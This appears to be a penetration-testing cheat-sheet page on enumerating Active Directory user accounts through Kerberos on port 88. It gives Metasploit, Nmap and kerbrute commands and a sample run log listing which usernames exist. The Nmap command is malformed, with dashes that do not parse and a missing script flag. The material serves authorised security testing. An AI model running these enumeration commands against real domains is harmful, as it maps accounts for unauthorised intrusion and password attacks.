---
description: >-
  Kerberos is a computer-network authentication protocol that works on the basis
  of tickets to allow nodes communicating over a non-secure network to prove
  their identity to one another in a secure way.
---

# 88 - Kerberos

## User Enumeration

Enumerate valid Domain Users via Kerberos from a wholly unauthenticated perspective. It utilises the different responses returned by the service to identify users that exist within the target domain.

### Metasploit

```
use auxiliary/gather/kerberos_enumusers
```

Example

```
msf auxiliary(kerberos_enumusers) > set DOMAIN MYDOMAIN
DOMAIN => MYDOMAIN
msf auxiliary(kerberos_enumusers) > set RHOST 192.168.5.1
RHOST => 192.168.5.1
msf auxiliary(kerberos_enumusers) > set USER_FILE /job/users.txt
USER_FILE => /job/users.txt
msf auxiliary(kerberos_enumusers) > run

[*] Validating options...
[*] Using domain: MYDOMAIN...
[*] 192.168.5.1:88 - Testing User: "bob"...
[*] 192.168.5.1:88 - KDC_ERR_PREAUTH_REQUIRED - Additional
pre-authentication required
[+] 192.168.5.1:88 - User: "bob" is present
[*] 192.168.5.1:88 - Testing User: "alice"...
[*] 192.168.5.1:88 - KDC_ERR_PREAUTH_REQUIRED - Additional
pre-authentication required
[+] 192.168.5.1:88 - User: "alice" is present
[*] 192.168.5.1:88 - Testing User: "matt"...
[*] 192.168.5.1:88 - KDC_ERR_PREAUTH_REQUIRED - Additional
pre-authentication required
[+] 192.168.5.1:88 - User: "matt" is present
[*] 192.168.5.1:88 - Testing User: "guest"...
[*] 192.168.5.1:88 - KDC_ERR_CLIENT_REVOKED - Clients credentials have
been revoked
[-] 192.168.5.1:88 - User: "guest" account disabled or locked out
[*] 192.168.5.1:88 - Testing User: "admint"...
[*] 192.168.5.1:88 - KDC_ERR_C_PRINCIPAL_UNKNOWN - Client not found in
Kerberos database
[*] 192.168.5.1:88 - User: "admint" does not exist
[*] 192.168.5.1:88 - Testing User: "admin"...
[*] 192.168.5.1:88 - KDC_ERR_C_PRINCIPAL_UNKNOWN - Client not found in
Kerberos database
[*] 192.168.5.1:88 - User: "admin" does not exist
[*] 192.168.5.1:88 - Testing User: "administrator"...
[*] 192.168.5.1:88 - KDC_ERR_C_PRINCIPAL_UNKNOWN - Client not found in
Kerberos database
[*] 192.168.5.1:88 - User: "administrator" does not exist
[*] Auxiliary module execution completed
msf auxiliary(kerberos_enumusers) >
```

### Nmap

```
Nmap –p 88 –script-args krb5-enum-users.realm='[domain]',userdb=[user list] [DC IP]
```

### Kerbrure

A tool to quickly brute force and enumerate valid Active Directory accounts through Kerberos Pre-Authentication

Link: [https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)

```
root@kali# kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175
```

